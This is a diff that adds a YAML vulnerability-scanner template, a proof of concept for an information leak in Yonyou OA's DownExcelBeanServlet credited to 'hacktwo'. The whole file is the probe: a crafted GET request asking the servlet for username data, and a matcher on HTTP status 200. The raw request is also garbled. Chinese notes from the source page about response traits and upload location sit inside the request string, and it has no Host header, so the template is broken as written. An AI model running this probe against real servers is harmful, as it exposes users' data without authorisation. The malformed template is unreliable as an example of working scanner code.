@@ -1,0 +1,34 @@
+id: poc-rrl68hf6afgnqdw6
+info:
+  name: 用友 OA DownExcelBeanServlet 信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rrl68hf6afgnqdw6'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rrl68hf6afgnqdw6
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    @
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
